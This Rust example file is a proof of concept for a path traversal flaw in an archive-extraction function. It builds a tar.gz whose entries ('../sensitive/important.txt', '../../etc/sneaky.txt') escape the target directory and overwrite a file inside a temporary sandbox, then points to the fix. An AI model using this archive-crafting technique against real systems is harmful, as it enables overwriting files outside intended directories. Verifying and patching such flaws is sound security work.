//! Proof of Concept: Path Traversal Vulnerability in extract_archive
//!
//! This demonstrates how a malicious tar.gz archive can write files outside
//! the intended target directory, exploiting the lack of path validation.
//!
//! Run with: cargo run --example poc_path_traversal
//!
//! IMPORTANT: This is for security testing purposes only. Only run in a
//! controlled environment to verify the vulnerability before applying the fix.

use std::{fs, io::Write, path::PathBuf};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("=== Path Traversal Vulnerability PoC ===\n");

    // Create a temporary test environment
    let test_dir = tempfile::tempdir()?;
    let test_path = test_dir.path();

    println!("Test directory: {}", test_path.display());

    // Create subdirectories to simulate a more realistic scenario
    let extract_target = test_path.join("safe_extraction_zone");
    let sensitive_area = test_path.join("sensitive");

    fs::create_dir_all(&extract_target)?;
    fs::create_dir_all(&sensitive_area)?;

    // Create a "sensitive" file that we'll try to overwrite
    let sensitive_file = sensitive_area.join("important.txt");
    fs::write(&sensitive_file, b"ORIGINAL SENSITIVE DATA")?;
    println!("Created sensitive file: {}", sensitive_file.display());
    println!("Original content: {:?}\n", fs::read_to_string(&sensitive_file)?);

    // Create malicious tar.gz archive with path traversal
    let malicious_archive = create_malicious_archive(&test_path)?;
    println!("Created malicious archive: {}\n", malicious_archive.display());

    // List the contents of the malicious archive
    println!("Archive contents:");
    list_archive_contents(&malicious_archive)?;
    println!();

    // Attempt to extract using the vulnerable function
    println!("Attempting extraction to: {}", extract_target.display());
    println!("(This should stay within safe_extraction_zone, but won't)\n");

    match pluto_app::utils::extract_archive(&malicious_archive, &extract_target) {
        Ok(_) => {
            println!("✗ VULNERABILITY CONFIRMED: Extraction succeeded!\n");

            // Check if the path traversal worked
            if sensitive_file.exists() {
                let new_content = fs::read_to_string(&sensitive_file)?;
                if new_content.contains("MALICIOUS") {
                    println!("✗ CRITICAL: Sensitive file was OVERWRITTEN!");
                    println!("New content: {:?}\n", new_content);

                    println!("The malicious archive successfully wrote outside the target directory!");
                    println!("Path traversal attack succeeded via: ../sensitive/important.txt\n");
                } else {
                    println!("✓ File still has original content (attack failed)");
                }
            }

            // Show what was extracted and where
            println!("Files extracted in safe zone:");
            show_directory_tree(&extract_target, 0)?;

            // Calculate the relative path that was exploited
            let relative = pathdiff::diff_paths(&sensitive_file, &extract_target)
                .unwrap_or_else(|| PathBuf::from("unknown"));
            println!("\nExploited path: {}", relative.display());
        }
        Err(e) => {
            println!("✓ Extraction failed (vulnerability may be patched): {}\n", e);
        }
    }

    println!("\n=== Attack Vectors Demonstrated ===");
    println!("1. ../ path traversal to escape target directory");
    println!("2. Overwriting files in parent directories");
    println!("3. Potential to overwrite system files (if running with permissions)");

    println!("\n=== Mitigation Required ===");
    println!("Validate all extracted paths stay within target directory!");
    println!("See: https://cwe.mitre.org/data/definitions/22.html");

    Ok(())
}

/// Creates a malicious tar.gz archive with path traversal entries
fn create_malicious_archive(test_dir: &std::path::Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let archive_path = test_dir.join("malicious.tar.gz");
    let tar_file = fs::File::create(&archive_path)?;

    let encoder = flate2::write::GzEncoder::new(tar_file, flate2::Compression::default());
    let mut tar = tar::Builder::new(encoder);

    // Add a legitimate-looking file first
    let mut header = tar::Header::new_gnu();
    let legitimate_content = b"This looks normal";
    header.set_path("readme.txt")?;
    header.set_size(legitimate_content.len() as u64);
    header.set_cksum();
    tar.append(&header, &legitimate_content[..])?;

    // Add malicious file with path traversal
    let mut header = tar::Header::new_gnu();
    let malicious_content = b"MALICIOUS PAYLOAD - You've been pwned!";

    // This path will escape the extraction directory
    header.set_path("../sensitive/important.txt")?;
    header.set_size(malicious_content.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    tar.append(&header, &malicious_content[..])?;

    // Add another traversal with multiple levels
    let mut header = tar::Header::new_gnu();
    let deep_traversal = b"Deep traversal attack";
    header.set_path("../../etc/sneaky.txt")?;
    header.set_size(deep_traversal.len() as u64);
    header.set_cksum();
    tar.append(&header, &deep_traversal[..])?;

    tar.finish()?;

    Ok(archive_path)
}

/// Lists the contents of a tar.gz archive
fn list_archive_contents(archive_path: &std::path::Path) -> Result<(), Box<dyn std::error::Error>> {
    let tar_gz = fs::File::open(archive_path)?;
    let decompressor = flate2::read::GzDecoder::new(tar_gz);
    let mut archive = tar::Archive::new(decompressor);

    for (i, entry) in archive.entries()?.enumerate() {
        let entry = entry?;
        let path = entry.path()?;
        let size = entry.size();

        // Check for path traversal indicators
        let is_suspicious = path.components().any(|c| {
            matches!(c, std::path::Component::ParentDir)
        });

        let marker = if is_suspicious { "⚠️  SUSPICIOUS" } else { "   " };

        println!("  [{}] {} - {} bytes - {}",
            i,
            path.display(),
            size,
            marker
        );
    }

    Ok(())
}

/// Recursively shows directory tree
fn show_directory_tree(path: &std::path::Path, depth: usize) -> Result<(), Box<dyn std::error::Error>> {
    if !path.exists() {
        return Ok(());
    }

    let indent = "  ".repeat(depth);

    if path.is_file() {
        println!("{}└─ {} (file)", indent, path.file_name().unwrap().to_string_lossy());
        return Ok(());
    }

    for entry in fs::read_dir(path)? {
        let entry = entry?;
        let entry_path = entry.path();
        let name = entry.file_name();

        if entry_path.is_dir() {
            println!("{}├─ {}/", indent, name.to_string_lossy());
            show_directory_tree(&entry_path, depth + 1)?;
        } else {
            println!("{}├─ {}", indent, name.to_string_lossy());
        }
    }

    Ok(())
}
